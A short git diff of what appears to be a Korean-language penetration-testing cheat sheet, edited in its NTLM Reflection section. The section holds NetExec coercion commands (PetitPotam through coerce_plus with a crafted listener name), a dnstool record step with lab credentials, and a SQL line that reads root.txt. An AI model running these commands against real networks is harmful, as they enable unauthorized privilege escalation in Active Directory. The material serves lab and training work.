@@ -1057,8 +1057,9 @@ SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_
   <summary><strong>NTLM Reflection</strong></summary>
 
 - https://www.rbtsec.com/blog/ntlm-reflection-abusing-ntlm-for-privilege-escalation-cve-2025-33073/
+- `SMB` 인증이 되지 않을시 다른 포트를 시도해보기.
 ```
-# 취약점 확인(AD 계정을 획득하면 시도)
+# 강제 인증 유도 확인
 nxc smb 192.168.115.185 -u scarter -p Passw0rd -M coerce_plus
 
 # 로컬로 오는 인증을 릴레이
@@ -1071,5 +1072,5 @@ python3 dnstool.py -u 'shield.local\scarter' -p 'Passw0rd' dc4.shield.local -a a
 # 인증 시도
 nxc smb 192.168.115.185 -u scarter -p Passw0rd -M coerce_plus -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
 ```
-  
+
 </details>
